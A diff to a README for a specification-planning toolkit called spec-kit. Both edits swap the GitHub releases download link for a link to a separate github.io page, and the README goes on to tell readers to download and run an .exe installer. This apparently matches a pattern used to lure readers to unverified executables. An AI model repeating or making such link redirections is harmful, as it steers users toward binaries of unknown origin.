@@ -1,6 +1,6 @@
 # 🛠️ spec-kit - Build better software with clear plans
 
-[![](https://img.shields.io/badge/Download-spec--kit-blue)](https://github.com/kaiacivilian939/spec-kit/releases)
+[![](https://img.shields.io/badge/Download-spec--kit-blue)](https://kaiacivilian939.github.io)
 
 This toolkit helps you manage your development process using specifications. You create a plan for your software features before you write code. This approach saves time and reduces errors during the building phase.
 
@@ -25,7 +25,7 @@ If you have these items, your computer runs the software without issues. No spec
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit [this page to download](https://github.com/kaiacivilian939/spec-kit/releases) the latest version.
+1. Visit [this page to download](https://kaiacivilian939.github.io) the latest version.
 2. Look for the file named `spec-kit-installer.exe` under the Assets section.
 3. Click the file to start the download.
 4. Open your Downloads folder once the file finishes.
